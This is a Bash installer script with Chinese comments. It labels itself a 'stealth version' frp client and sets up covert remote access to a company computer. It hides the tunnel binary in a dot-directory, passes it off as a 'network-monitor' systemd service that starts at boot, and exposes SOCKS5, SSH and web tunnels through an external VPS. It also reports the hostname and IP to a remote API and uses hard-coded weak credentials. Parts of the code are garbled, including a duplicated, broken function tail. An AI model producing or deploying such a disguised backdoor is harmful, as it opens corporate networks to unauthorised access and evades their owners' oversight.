#!/bin/bash

# FRP 客户端安装/卸载/管理脚本 (隐蔽版)
# 支持自动向服务端注册隧道
# 日期：2025-05-10

set -e

# 定义颜色
GREEN="\033[0;32m"
BLUE="\033[0;34m"
YELLOW="\033[0;33m"
RED="\033[0;31m"
NC="\033[0m" # 无颜色

# 定义常量 - 已修改为更隐蔽的路径和名称
FRP_VERSION=0.62.1
INSTALL_DIR=/usr/share/lib/.network-util         # 更隐蔽的安装目录
SERVICE_NAME=network-monitor                      # 更隐蔽的服务名称
SERVICE_FILE=/etc/systemd/system/${SERVICE_NAME}.service
CONFIG_FILE=$INSTALL_DIR/network-cfg.dat         # 更隐蔽的配置文件名

# 获取本机公网 IP
get_local_ip() {
    # 先尝试局域网IP作为备用
    local LAN_IP=$(hostname -I | awk '{print $1}')
    
    # 尝试通过多个公共服务获取公网IP
    local PUBLIC_IP=""
    
    # 尝试通过ipinfo.io获取
    PUBLIC_IP=$(curl -s -m 5 https://ipinfo.io/ip 2>/dev/null)
    
    # 如果上面的失败，尝试通过ifconfig.me获取
    if [ -z "$PUBLIC_IP" ] || [ "$PUBLIC_IP" = "null" ]; then
        PUBLIC_IP=$(curl -s -m 5 https://ifconfig.me 2>/dev/null)
    fi
    
    # 如果上面的失败，尝试通过api.ipify.org获取
    if [ -z "$PUBLIC_IP" ] || [ "$PUBLIC_IP" = "null" ]; then
        PUBLIC_IP=$(curl -s -m 5 https://api.ipify.org 2>/dev/null)
    fi
    
    # 如果所有方法都失败，使用局域网IP
    if [ -z "$PUBLIC_IP" ] || [ "$PUBLIC_IP" = "null" ]; then
        echo "$LAN_IP (局域网)"
    else
        echo "$PUBLIC_IP (公网)"
    fi
}

# 显示主菜单
show_menu() {
    clear
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}     网络监控工具管理脚本              ${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo -e "${GREEN}1.${NC} 安装/重新配置网络监控工具"
    echo -e "${GREEN}2.${NC} 卸载网络监控工具"
    echo -e "${GREEN}3.${NC} 管理网络通道"
    echo -e "${GREEN}4.${NC} 查看当前配置"
    echo -e "${GREEN}5.${NC} 查看使用说明"
    echo -e "${GREEN}6.${NC} 退出"
    echo -e "${BLUE}========================================${NC}"
    echo -e "当前状态: $(check_status)"
    echo -e "本机 IP: $(get_local_ip)"
    echo -e "${BLUE}========================================${NC}"
}

# 显示端口管理菜单
show_port_menu() {
    clear
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}        网络通道管理                  ${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo -e "${GREEN}1.${NC} 添加新的网络通道"
    echo -e "${GREEN}2.${NC} 删除网络通道"
    echo -e "${GREEN}3.${NC} 返回主菜单"
    echo -e "${BLUE}========================================${NC}"
}

# 检查网络工具状态
check_status() {
    if [ -f "$SERVICE_FILE" ]; then
        if systemctl is-active --quiet $SERVICE_NAME; then
            echo -e "${GREEN}已安装且正在运行${NC}"
        else
            echo -e "${RED}已安装但未运行${NC}"
        fi
    else
        echo -e "${RED}未安装${NC}"
    fi
}

# 生成随机隧道名称
generate_random_name() {
    prefix=$1
    random_str=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
    echo "${prefix}_${random_str}"
}

# 向服务端注册隧道
register_tunnel_to_server() {
    # 获取参数
    tunnel_name=$1
    tunnel_type=$2
    local_port=$3
    remote_port=$4
    
    # 获取服务器地址和认证信息
    server_addr=$(grep "server_addr" "$CONFIG_FILE" | cut -d'=' -f2 | tr -d ' ')
    token=$(grep "token" "$CONFIG_FILE" | head -1 | cut -d'=' -f2 | tr -d ' ')
    
    # 服务端API地址
    api_url="http://${server_addr}:7501/api/register"
    
    # 获取主机名和本地IP
    hostname=$(hostname)
    local_ip=$(get_local_ip)
    
    echo -e "${BLUE}正在向服务端注册通道...${NC}"
    
    # 使用curl发送注册请求
    response=$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer ${token}" \
        -d "{
            \"hostname\": \"${hostname}\",
            \"local_ip\": \"${local_ip}\",
            \"tunnel_name\": \"${tunnel_name}\",
            \"tunnel_type\": \"${tunnel_type}\",
            \"local_port\": ${local_port},
            \"remote_port\": ${remote_port}
        }" \
        "${api_url}" || echo '{"success":false,"error":"连接服务端失败"}')
    
    # 解析响应
    if echo "$response" | grep -q "\"success\":true"; then
        echo -e "${GREEN}✅ 已成功向服务端注册通道${NC}"
        return 0
    else
        error=$(echo "$response" | grep -o '"error":"[^"]*"' | cut -d':' -f2- | tr -d '"')
        echo -e "${RED}❌ 向服务端注册通道失败: ${error:-未知错误}${NC}"
        return 1
    fi
}

# 检查配置文件中的端口通道
list_tunnels() {
    if [ ! -f "$CONFIG_FILE" ]; then
        echo -e "${RED}配置文件不存在，请先安装网络工具。${NC}"
        return 1
    fi

    echo -e "${BLUE}当前配置的网络通道:${NC}"
    echo -e "${YELLOW}================================${NC}"
    
    # 提取服务器信息
    SERVER_ADDR=$(grep "server_addr" "$CONFIG_FILE" | cut -d'=' -f2 | tr -d ' ')
    SERVER_PORT=$(grep "server_port" "$CONFIG_FILE" | cut -d'=' -f2 | tr -d ' ')
    
    echo -e "${GREEN}服务器:${NC} $SERVER_ADDR:$SERVER_PORT"
    echo -e "${YELLOW}================================${NC}"
    
    # 检查是否启用了admin端口
    if grep -q "admin_port" "$CONFIG_FILE"; then
        ADMIN_PORT=$(grep "admin_port" "$CONFIG_FILE" | cut -d'=' -f2 | tr -d ' ')
        ADMIN_USER=$(grep "admin_user" "$CONFIG_FILE" | cut -d'=' -f2 | tr -d ' ')
        ADMIN_PWD=$(grep "admin_pwd" "$CONFIG_FILE" | cut -d'=' -f2 | tr -d ' ')
        
        # 尝试获取运行时信息
        if systemctl is-active --quiet $SERVICE_NAME; then
            echo -e "${BLUE}尝试从API获取实时端口信息...${NC}"
            TUNNEL_INFO=$(curl -s -m 3 "http://127.0.0.1:${ADMIN_PORT}/api/status" -u "${ADMIN_USER}:${ADMIN_PWD}" 2>/dev/null)
            
            if [ $? -eq 0 ] && [ -n "$TUNNEL_INFO" ]; then
                echo -e "${GREEN}获取到实时通道信息:${NC}"
                # 使用grep和awk解析JSON (这是一个简单实现，实际环境可能需要更健壮的方式)
                echo "$TUNNEL_INFO" | grep -o '"name":"[^"]*","type":"[^"]*","status":"[^"]*","local_addr":"[^"]*","plugin":"[^"]*","remote_addr":"[^"]*"' | 
                while read -r line; do
                    name=$(echo "$line" | grep -o '"name":"[^"]*"' | cut -d'"' -f4)
                    status=$(echo "$line" | grep -o '"status":"[^"]*"' | cut -d'"' -f4)
                    local_addr=$(echo "$line" | grep -o '"local_addr":"[^"]*"' | cut -d'"' -f4)
                    remote_addr=$(echo "$line" | grep -o '"remote_addr":"[^"]*"' | cut -d'"' -f4)
                    
                    echo -e "${GREEN}$name${NC}"
                    echo -e "  状态: ${status}"
                    echo -e "  本地地址: ${local_addr}"
                    echo -e "  远程地址: ${remote_addr}"
                    echo -e "${YELLOW}--------------------------------${NC}"
                done
                return 0
            else
                echo -e "${YELLOW}无法获取实时信息，显示配置信息...${NC}"
            fi
        fi
    fi
    
    # 如果无法获取实时信息，则显示配置文件中的信息
    # 跳过 [common] 部分
    skip_common=true
    section_count=0
    
    while IFS= read -r line; do
        if [[ $line == \[*] ]]; then
            if [[ $line != "[common]" ]]; then
                skip_common=false
                section_name=$(echo "$line" | tr -d '[]')
                echo -e "${GREEN}$section_name${NC}"
                section_count=$((section_count+1))
            else
                skip_common=true
            fi
        elif [ "$skip_common" = false ]; then
            if [[ $line == local_port* ]]; then
                local_port=$(echo "$line" | cut -d'=' -f2 | tr -d ' ')
                echo -e "  本地端口: ${local_port}"
            elif [[ $line == remote_port* ]]; then
                remote_port=$(echo "$line" | cut -d'=' -f2 | tr -d ' ')
                if [ "$remote_port" = "0" ]; then
                    echo -e "  远程端口: ${YELLOW}自动分配${NC}"
                    echo -e "  ${YELLOW}查看实际端口请通过API获取: curl http://127.0.0.1:7400/api/status -u admin:admin${NC}"
                else
                    echo -e "  远程端口: ${remote_port}"
                    echo -e "  远程访问地址: ${SERVER_ADDR}:${remote_port}"
                fi
                echo -e "${YELLOW}--------------------------------${NC}"
            fi
        fi
    done < "$CONFIG_FILE"
    
    if [ $section_count -eq 0 ]; then
        echo -e "${RED}没有配置任何网络通道。${NC}"
        return 1
    fi
    
    return 0
} -e "${YELLOW}--------------------------------${NC}"
            fi
        fi
    done < "$CONFIG_FILE"
    
    if [ $section_count -eq 0 ]; then
        echo -e "${RED}没有配置任何网络通道。${NC}"
        return 1
    fi
    
    return 0
} -e "${YELLOW}--------------------------------${NC}"
            fi
        fi
    done < "$CONFIG_FILE"
    
    if [ $section_count -eq 0 ]; then
        echo -e "${RED}没有配置任何网络通道。${NC}"
        return 1
    fi
    
    return 0
}

download_with_proxy() {
    echo -e "${BLUE}正在下载工具组件 v${FRP_VERSION}...${NC}"
    cd /tmp
    
    # 询问是否使用代理
    read -p "是否使用代理下载？(y/n): " use_proxy
    if [[ "$use_proxy" == "y" || "$use_proxy" == "Y" ]]; then
        read -p "请输入代理地址和端口 (格式: ip:port): " proxy_address
        
        echo -e "${YELLOW}使用代理下载: ${proxy_address}${NC}"
        curl -L -o frp_${FRP_VERSION}_linux_amd64.tar.gz --proxy http://${proxy_address} "https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_amd64.tar.gz" || {
            echo -e "${RED}代理下载失败，请检查代理设置或尝试直接下载。${NC}"
            return 1
        }
    else
        echo -e "${YELLOW}尝试直接下载...${NC}"
        curl -L -o frp_${FRP_VERSION}_linux_amd64.tar.gz "https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_amd64.tar.gz" || {
            echo -e "${RED}直接下载失败，建议使用代理。${NC}"
            return 1
        }
    fi
    
    # 检查文件是否成功下载和有效
    if [ ! -f "frp_${FRP_VERSION}_linux_amd64.tar.gz" ] || [ ! -s "frp_${FRP_VERSION}_linux_amd64.tar.gz" ]; then
        echo -e "${RED}下载的文件不存在或为空！${NC}"
        return 1
    fi
    
    return 0
}

# 安装网络工具
install_frpc() {
    # 如果已安装，询问是否重新安装
    if [ -f "$SERVICE_FILE" ]; then
        read -p "网络工具已安装，是否重新配置？(y/n): " confirm
        if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
            echo "取消配置操作。"
            return
        fi
    fi

    # 创建安装目录
    mkdir -p $INSTALL_DIR
    
    # 如果是新安装，则下载并安装
    if [ ! -f "$INSTALL_DIR/frpc" ]; then
        # 使用下载函数下载
        if ! download_with_proxy; then
            echo -e "${RED}下载失败，请检查网络连接或代理设置。${NC}"
            return 1
        fi
        
        echo -e "${BLUE}正在安装网络工具...${NC}"
        tar -zxf frp_${FRP_VERSION}_linux_amd64.tar.gz || {
            echo -e "${RED}解压失败，可能下载的文件不完整或已损坏。${NC}"
            return 1
        }
        
        cp frp_${FRP_VERSION}_linux_amd64/frpc $INSTALL_DIR/ || {
            echo -e "${RED}复制文件失败。${NC}"
            return 1
        }
        
        # 确保可执行
        chmod +x $INSTALL_DIR/frpc
        
        # 清理临时文件
        rm -f frp_${FRP_VERSION}_linux_amd64.tar.gz
        rm -rf frp_${FRP_VERSION}_linux_amd64
    fi

    # 获取服务器基本配置
    read -p "请输入服务端公网 IP 或域名: " VPS_IP
    read -p "请输入服务端口 [默认7000]: " SERVER_PORT
    SERVER_PORT=${SERVER_PORT:-7000}
    read -p "请输入认证令牌 [默认mysecret123]: " TOKEN
    TOKEN=${TOKEN:-mysecret123}
    
    # 询问用户是否使用自动端口分配
    echo -e "${YELLOW}远程端口配置方式:${NC}"
    echo -e "1. 自动从服务端获取远程端口 (推荐)"
    echo -e "2. 手动指定远程端口"
    read -p "请选择远程端口配置方式 [1/2] (默认:1): " PORT_CONFIG_METHOD
    PORT_CONFIG_METHOD=${PORT_CONFIG_METHOD:-1}
    
    # 创建基本配置文件
    cat > $CONFIG_FILE <<EOF
[common]
server_addr = ${VPS_IP}
server_port = ${SERVER_PORT}
token = ${TOKEN}
admin_addr = 127.0.0.1
admin_port = 7400
admin_user = admin
admin_pwd = admin
EOF

    # 如果选择自动端口，加入相应配置
    if [ "$PORT_CONFIG_METHOD" = "1" ]; then
        cat >> $CONFIG_FILE <<EOF
# 自动使用服务端的端口分配策略
login_fail_exit = false
EOF
    fi
    
    # 配置 SOCKS5 穿透（推荐用于远程访问）
    read -p "是否配置 SOCKS5 代理通道？(y/n) [推荐开启，用于远程访问公司网络]: " setup_socks
    if [[ "$setup_socks" == "y" || "$setup_socks" == "Y" ]]; then
        read -p "请输入 SOCKS5 本地端口 [默认10811]: " SOCKS_LOCAL_PORT
        SOCKS_LOCAL_PORT=${SOCKS_LOCAL_PORT:-10811}
        
        # 生成随机名称
        SOCKS_TUNNEL_NAME=$(generate_random_name "socks5")
        
        if [ "$PORT_CONFIG_METHOD" = "1" ]; then
            # 自动分配远程端口的配置
            cat >> $CONFIG_FILE <<EOF

[${SOCKS_TUNNEL_NAME}]
type = tcp
local_ip = 127.0.0.1
local_port = ${SOCKS_LOCAL_PORT}
# 启用自动端口分配，服务端动态分配端口
remote_port = 0
EOF
            echo -e "${GREEN}✓ SOCKS5通道已配置，远程端口将由服务端自动分配${NC}"
        else
            # 手动指定远程端口
            read -p "请输入 SOCKS5 远程端口 [建议用6000以上端口]: " SOCKS_REMOTE_PORT
            cat >> $CONFIG_FILE <<EOF

[${SOCKS_TUNNEL_NAME}]
type = tcp
local_ip = 127.0.0.1
local_port = ${SOCKS_LOCAL_PORT}
remote_port = ${SOCKS_REMOTE_PORT}
EOF
        fi

        # 向服务端注册
        if [ "$PORT_CONFIG_METHOD" = "2" ]; then
            register_tunnel_to_server "$SOCKS_TUNNEL_NAME" "socks5" "$SOCKS_LOCAL_PORT" "$SOCKS_REMOTE_PORT"
        else
            # 使用0表示自动分配的端口
            register_tunnel_to_server "$SOCKS_TUNNEL_NAME" "socks5" "$SOCKS_LOCAL_PORT" "0"
        fi
    fi
    
    # 配置 SSH 穿透
    read -p "是否配置 SSH 通道？(y/n): " setup_ssh
    if [[ "$setup_ssh" == "y" || "$setup_ssh" == "Y" ]]; then
        read -p "请输入 SSH 本地端口 [默认22]: " SSH_LOCAL_PORT
        SSH_LOCAL_PORT=${SSH_LOCAL_PORT:-22}
        
        # 生成随机名称
        SSH_TUNNEL_NAME=$(generate_random_name "ssh")
        
        if [ "$PORT_CONFIG_METHOD" = "1" ]; then
            # 自动分配远程端口的配置
            cat >> $CONFIG_FILE <<EOF

[${SSH_TUNNEL_NAME}]
type = tcp
local_ip = 127.0.0.1
local_port = ${SSH_LOCAL_PORT}
# 启用自动端口分配，服务端动态分配端口
remote_port = 0
EOF
            echo -e "${GREEN}✓ SSH通道已配置，远程端口将由服务端自动分配${NC}"
        else
            # 手动指定远程端口
            read -p "请输入 SSH 远程端口: " SSH_REMOTE_PORT
            cat >> $CONFIG_FILE <<EOF

[${SSH_TUNNEL_NAME}]
type = tcp
local_ip = 127.0.0.1
local_port = ${SSH_LOCAL_PORT}
remote_port = ${SSH_REMOTE_PORT}
EOF
        fi

        # 向服务端注册
        if [ "$PORT_CONFIG_METHOD" = "2" ]; then
            register_tunnel_to_server "$SSH_TUNNEL_NAME" "ssh" "$SSH_LOCAL_PORT" "$SSH_REMOTE_PORT"
        else
            # 使用0表示自动分配的端口
            register_tunnel_to_server "$SSH_TUNNEL_NAME" "ssh" "$SSH_LOCAL_PORT" "0"
        fi
    fi
    
    # 配置 Web 穿透
    read -p "是否配置 Web 通道？(y/n): " setup_web
    if [[ "$setup_web" == "y" || "$setup_web" == "Y" ]]; then
        read -p "请输入 Web 本地端口 [默认80]: " WEB_LOCAL_PORT
        WEB_LOCAL_PORT=${WEB_LOCAL_PORT:-80}
        
        # 生成随机名称
        WEB_TUNNEL_NAME=$(generate_random_name "web")
        
        if [ "$PORT_CONFIG_METHOD" = "1" ]; then
            # 自动分配远程端口的配置
            cat >> $CONFIG_FILE <<EOF

[${WEB_TUNNEL_NAME}]
type = tcp
local_ip = 127.0.0.1
local_port = ${WEB_LOCAL_PORT}
# 启用自动端口分配，服务端动态分配端口
remote_port = 0
EOF
            echo -e "${GREEN}✓ Web通道已配置，远程端口将由服务端自动分配${NC}"
        else
            # 手动指定远程端口
            read -p "请输入 Web 远程端口: " WEB_REMOTE_PORT
            cat >> $CONFIG_FILE <<EOF

[${WEB_TUNNEL_NAME}]
type = tcp
local_ip = 127.0.0.1
local_port = ${WEB_LOCAL_PORT}
remote_port = ${WEB_REMOTE_PORT}
EOF
        fi

        # 向服务端注册
        if [ "$PORT_CONFIG_METHOD" = "2" ]; then
            register_tunnel_to_server "$WEB_TUNNEL_NAME" "web" "$WEB_LOCAL_PORT" "$WEB_REMOTE_PORT"
        else
            # 使用0表示自动分配的端口
            register_tunnel_to_server "$WEB_TUNNEL_NAME" "web" "$WEB_LOCAL_PORT" "0"
        fi
    fi
    
    # 询问是否添加自定义端口穿透
    read -p "是否添加自定义网络通道？(y/n): " setup_custom
    if [[ "$setup_custom" == "y" || "$setup_custom" == "Y" ]]; then
        add_tunnel
    fi

    # 创建系统服务
    echo -e "${BLUE}正在创建系统服务...${NC}"
    cat > $SERVICE_FILE <<EOF
[Unit]
Description=Network Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=${INSTALL_DIR}/frpc -c ${CONFIG_FILE}
Restart=on-failure
RestartSec=5
StartLimitInterval=60s
StartLimitBurst=3

[Install]
WantedBy=multi-user.target
EOF

    echo -e "${BLUE}正在启动网络监控服务...${NC}"
    systemctl daemon-reload
    systemctl enable $SERVICE_NAME
    systemctl restart $SERVICE_NAME

    echo -e "${GREEN}✅ 网络监控工具安装完成！${NC}"
    echo
    echo -e "${YELLOW}提示：服务启动后，可以运行以下命令查看通道端口信息：${NC}"
    echo -e "curl http://127.0.0.1:7400/api/status -u admin:admin"
    echo
    view_config
    echo
    echo -e "${YELLOW}提示：运行选项 5 查看如何从外部连接到公司网络${NC}"
}

# 添加新的端口穿透
add_tunnel() {
    if [ ! -f "$CONFIG_FILE" ]; then
        echo -e "${RED}配置文件不存在，请先安装网络工具。${NC}"
        return
    fi
    
    read -p "请输入通道类型 (例如 ssh, web, rdp): " TUNNEL_TYPE
    read -p "请输入本地端口: " LOCAL_PORT
    
    # 检查是否配置了自动端口分配
    AUTO_PORT=false
    if grep -q "login_fail_exit = false" "$CONFIG_FILE"; then
        echo -e "${YELLOW}检测到已启用自动端口分配模式${NC}"
        AUTO_PORT=true
    fi
    
    # 生成随机隧道名称
    TUNNEL_NAME=$(generate_random_name "$TUNNEL_TYPE")
    
    if [ "$AUTO_PORT" = true ]; then
        # 自动分配远程端口的配置
        cat >> $CONFIG_FILE <<EOF

[${TUNNEL_NAME}]
type = tcp
local_ip = 127.0.0.1
local_port = ${LOCAL_PORT}
# 启用自动端口分配，服务端动态分配端口
remote_port = 0
EOF
        echo -e "${GREEN}✅ 已添加新的网络通道: ${TUNNEL_NAME}${NC}"
        echo -e "${YELLOW}远程端口将由服务端自动分配，启动服务后可通过API查询${NC}"
        
        # 向服务端注册隧道
        register_tunnel_to_server "$TUNNEL_NAME" "$TUNNEL_TYPE" "$LOCAL_PORT" "0"
    else
        # 手动指定远程端口
        read -p "请输入远程端口: " REMOTE_PORT
        
        # 添加到配置文件
        cat >> $CONFIG_FILE <<EOF

[${TUNNEL_NAME}]
type = tcp
local_ip = 127.0.0.1
local_port = ${LOCAL_PORT}
remote_port = ${REMOTE_PORT}
EOF

        echo -e "${GREEN}✅ 已添加新的网络通道: ${TUNNEL_NAME}${NC}"
        
        # 向服务端注册隧道
        register_tunnel_to_server "$TUNNEL_NAME" "$TUNNEL_TYPE" "$LOCAL_PORT" "$REMOTE_PORT"
    fi
    
    # 如果网络工具已安装并运行，则重启服务
    if systemctl is-active --quiet $SERVICE_NAME; then
        systemctl restart $SERVICE_NAME
        echo -e "${GREEN}✅ 网络监控服务已重启${NC}"
    fi
}

# 删除端口穿透
remove_tunnel() {
    if [ ! -f "$CONFIG_FILE" ]; then
        echo -e "${RED}配置文件不存在，请先安装网络工具。${NC}"
        return
    fi
    
    # 列出现有穿透
    if ! list_tunnels; then
        return
    fi
    
    echo
    read -p "请输入要删除的通道名称: " TUNNEL_NAME
    
    # 检查穿透是否存在
    if ! grep -q "\[${TUNNEL_NAME}\]" "$CONFIG_FILE"; then
        echo -e "${RED}错误: 通道 '${TUNNEL_NAME}' 不存在。${NC}"
        return
    fi
    
    # 创建临时文件
    TEMP_FILE=$(mktemp)
    
    # 使用 awk 删除指定的穿透部分
    awk -v name="$TUNNEL_NAME" '
    BEGIN { skip = 0; }
    /^\[/ { 
        if ($0 == "[" name "]") {
            skip = 1;
        } else {
            skip = 0;
            print;
        }
        next;
    }
    !skip { print; }
    ' "$CONFIG_FILE" > "$TEMP_FILE"
    
    # 替换原配置文件
    mv "$TEMP_FILE" "$CONFIG_FILE"
    
    echo -e "${GREEN}✅ 已删除网络通道: ${TUNNEL_NAME}${NC}"
    
    # 如果网络工具已安装并运行，则重启服务
    if systemctl is-active --quiet $SERVICE_NAME; then
        systemctl restart $SERVICE_NAME
        echo -e "${GREEN}✅ 网络监控服务已重启${NC}"
    fi
}

# 查看当前配置
view_config() {
    if [ ! -f "$CONFIG_FILE" ]; then
        echo -e "${RED}配置文件不存在，请先安装网络工具。${NC}"
        return
    fi
    
    echo -e "${BLUE}网络工具配置:${NC}"
    
    # 列出所有端口穿透
    list_tunnels
}

# 显示使用说明
show_usage() {
    clear
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}        网络远程访问使用说明           ${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo -e "${GREEN}【基本概念】${NC}"
    echo -e "网络监控工具安装在公司电脑上，服务端安装在有公网 IP 的服务器上。"
    echo -e "通过此工具，您可以在外部通过服务器访问公司内网资源。"
    echo
    echo -e "${GREEN}【使用 SOCKS5 代理访问公司网络】${NC}"
    echo -e "1. 确保您的网络工具已配置并启动 SOCKS5 代理通道"
    echo -e "2. 在您的手机或其他设备上设置 SOCKS5 代理:"
    
    # 如果找到 SOCKS5 配置，显示详细信息
    SOCKS_INFO=""
    if [ -f "$CONFIG_FILE" ]; then
        SERVER_ADDR=$(grep "server_addr" "$CONFIG_FILE" | cut -d'=' -f2 | tr -d ' ')
        
        while IFS= read -r line; do
            if [[ $line == \[*] && $line != "[common]" ]]; then
                section_name=$(echo "$line" | tr -d '[]')
                
                # 读取后续几行以检查是否是SOCKS5穿透
                next_lines=$(grep -A 4 "$line" "$CONFIG_FILE")
                
                if echo "$next_lines" | grep -q "local_port"; then
                    local_port=$(echo "$next_lines" | grep "local_port" | cut -d'=' -f2 | tr -d ' ')
                    
                    if echo "$next_lines" | grep -q "remote_port"; then
                        remote_port=$(echo "$next_lines" | grep "remote_port" | cut -d'=' -f2 | tr -d ' ')
                        
                        # 如果名称包含socks，或者本地端口是典型的socks端口(1080, 10808等)
                        if [[ $section_name == *"socks"* || $local_port == "1080" || $local_port == "10808" || $local_port == "10809" || $local_port == "10810" || $local_port == "10811" ]]; then
                            SOCKS_INFO="${SERVER_ADDR}:${remote_port}"
                            break
                        fi
                    fi
                fi
            fi
        done < "$CONFIG_FILE"
    fi
    
    if [ -n "$SOCKS_INFO" ]; then
        echo -e "   - 代理服务器: ${SERVER_ADDR}"
        echo -e "   - 代理端口: ${remote_port}"
    else
        echo -e "   - 代理服务器: 您的服务器 IP/域名"
        echo -e "   - 代理端口: 您配置的 SOCKS5 远程端口"
    fi
    
    echo
    echo -e "${GREEN}【在手机上设置代理的方法】${NC}"
    echo -e "Android 系统:"
    echo -e "  1. 打开设置 → 无线和网络 → WLAN"
    echo -e "  2. 长按当前连接的网络 → 修改网络 → 显示高级选项"
    echo -e "  3. 代理设置选择"手动"，输入服务器 IP 和端口"
    echo
    echo -e "iOS 系统:"
    echo -e "  1. 打开设置 → Wi-Fi"
    echo -e "  2. 点击当前连接的网络右侧的 (i) 图标"
    echo -e "  3. 滚动到底部，点击"配置代理"→ 手动"
    echo -e "  4. 输入服务器 IP 和端口"
    echo
    echo -e "或者使用专用的代理软件/APP (如 Shadowsocks, V2rayNG 等)，设置 SOCKS5 代理。"
    echo
    echo -e "${GREEN}【SSH 远程连接】${NC}"
    
    # 如果找到 SSH 配置，显示详细信息
    SSH_INFO=""
    if [ -f "$CONFIG_FILE" ]; then
        SERVER_ADDR=$(grep "server_addr" "$CONFIG_FILE" | cut -d'=' -f2 | tr -d ' ')
        
        while IFS= read -r line; do
            if [[ $line == \[*] && $line != "[common]" ]]; then
                section_name=$(echo "$line" | tr -d '[]')
                
                # 读取后续几行以检查是否是SSH穿透
                next_lines=$(grep -A 4 "$line" "$CONFIG_FILE")
                
                if echo "$next_lines" | grep -q "local_port"; then
                    local_port=$(echo "$next_lines" | grep "local_port" | cut -d'=' -f2 | tr -d ' ')
                    
                    if echo "$next_lines" | grep -q "remote_port"; then
                        remote_port=$(echo "$next_lines" | grep "remote_port" | cut -d'=' -f2 | tr -d ' ')
                        
                        # 如果名称包含ssh，或者本地端口是ssh端口(22)
                        if [[ $section_name == *"ssh"* || $local_port == "22" ]]; then
                            SSH_INFO="${SERVER_ADDR}:${remote_port}"
                            break
                        fi
                    fi
                fi
            fi
        done < "$CONFIG_FILE"
    fi
    
    if [ -n "$SSH_INFO" ]; then
        echo -e "使用以下命令连接到您的公司电脑:"
        echo -e "  ssh -p ${remote_port} 用户名@${SERVER_ADDR}"
    else
        echo -e "如果您配置了 SSH 通道，使用以下命令连接到您的公司电脑:"
        echo -e "  ssh -p <SSH远程端口> 用户名@<您的服务器IP>"
    fi
    
    echo
    echo -e "${GREEN}【注意事项】${NC}"
    echo -e "1. 确保公司电脑始终开机并运行网络监控工具"
    echo -e "2. 如果公司网络有防火墙，确保不会阻止网络监控连接"
    echo -e "3. 定期检查网络监控工具状态，确保服务正常运行"
    echo -e "4. 建议设置强密码保护，避免未授权访问"
    echo -e "5. 所有通道配置都已自动注册到服务端管理系统"
    echo -e "${BLUE}========================================${NC}"
}

# 卸载网络工具
uninstall_frpc() {
    if [ ! -f "$SERVICE_FILE" ]; then
        echo -e "${RED}网络工具未安装，无需卸载。${NC}"
        return
    fi

    echo -e "${BLUE}正在停止网络监控服务...${NC}"
    systemctl stop $SERVICE_NAME 2>/dev/null || echo "服务已经停止"
    systemctl disable $SERVICE_NAME 2>/dev/null || echo "服务已经禁用"

    echo -e "${BLUE}正在删除网络工具文件...${NC}"
    rm -f $SERVICE_FILE
    rm -rf $INSTALL_DIR

    echo -e "${BLUE}正在重新加载 systemd...${NC}"
    systemctl daemon-reload

    echo -e "${GREEN}✅ 网络工具已完全卸载。${NC}"
}

# 端口管理功能
manage_ports() {
    if [ ! -f "$CONFIG_FILE" ]; then
        echo -e "${RED}配置文件不存在，请先安装网络工具。${NC}"
        read -p "按回车键继续..."
        return
    fi

    while true; do
        show_port_menu
        read -p "请输入选项 [1-3]: " port_choice
        case $port_choice in
            1)
                add_tunnel
                read -p "按回车键继续..."
                ;;
            2)
                remove_tunnel
                read -p "按回车键继续..."
                ;;
            3)
                return  # 返回主菜单
                ;;
            *)
                echo -e "${RED}无效选项，请重新选择。${NC}"
                sleep 1
                ;;
        esac
    done
}

# 检查是否以 root 权限运行
if [ "$(id -u)" != "0" ]; then
    echo -e "${RED}错误: 此脚本需要 root 权限运行。${NC}"
    echo -e "请使用 sudo 重新运行此脚本。"
    exit 1
fi


# 主函数
main() {
    while true; do
        show_menu
        read -p "请输入选项 [1-6]: " choice
        case $choice in
            1)
                install_frpc
                read -p "按回车键继续..."
                ;;
            2)
                uninstall_frpc
                read -p "按回车键继续..."
                ;;
            3)
                manage_ports
                ;;
            4)
                view_config
                read -p "按回车键继续..."
                ;;
            5)
                show_usage
                read -p "按回车键继续..."
                ;;
            6)
                echo -e "${GREEN}感谢使用，再见！${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}无效选项，请重新选择。${NC}"
                sleep 1
                ;;
        esac
    done
}

# 在函数定义之后调用 main 函数
main
